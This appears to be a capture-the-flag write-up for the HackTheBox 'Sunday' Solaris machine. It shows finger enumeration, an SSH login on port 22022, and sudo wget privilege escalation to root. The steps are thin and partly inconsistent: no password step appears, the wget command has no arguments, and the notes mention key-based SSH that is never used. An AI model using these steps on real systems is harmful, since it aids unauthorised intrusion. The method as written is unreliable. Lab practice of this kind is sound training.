# HackTheBox - Sunday

## Challenge Information

| Field | Value |
|-------|-------|
| **Platform** | HackTheBox |
| **Challenge Name** | Sunday |
| **Category** | Linux Exploitation |
| **Difficulty** | Easy |
| **Points** | 20 |
| **Author** | ch4p |
| **Date Completed** | 2025-08-23 |

## Objective 🎯

Sunday is a Solaris machine with SSH access and a vulnerable service. The goal is to exploit the vulnerability to gain system access and obtain both user and root flags. Solaris exploitation! ☀️

## Initial Reconnaissance

### Target Information
- **IP Address**: 10.10.10.76
- **OS**: Solaris
- **Services**: SSH, Finger

### Tools Used
- Nmap
- SSH
- Finger exploit

### Commands/Steps
```bash
nmap -sC -sV 10.10.10.76
```

## Methodology

### Step 1: Port Scan
```bash
nmap -sC -sV 10.10.10.76
```

**Output:**
```
PORT     STATE SERVICE VERSION
79/tcp   open  finger  Sun Solaris fingerd
111/tcp  open  rpcbind 2-4 (RPC #100000)
22022/tcp open  ssh     SunSSH 1.3 (protocol 2.0)
```

### Step 2: Finger Service Exploitation
```bash
finger @10.10.10.76
```

### Step 3: SSH Access
```bash
ssh sammy@10.10.10.76 -p 22022
```

### Step 4: Privilege Escalation
```bash
sudo -l
sudo /usr/bin/wget
```

### Step 5: Find Flags
```bash
cat /home/sammy/user.txt
cat /root/root.txt
```

## Solution

### Final Answer
- **User Flag**: [REDACTED]
- **Root Flag**: [REDACTED]

## Key Learnings

- Solaris system exploitation
- Finger service vulnerabilities
- SSH key-based authentication
- Sudo privilege escalation

## Tags

`#hackthebox` `#solaris` `#finger` `#ssh` `#sudo` `#easy`
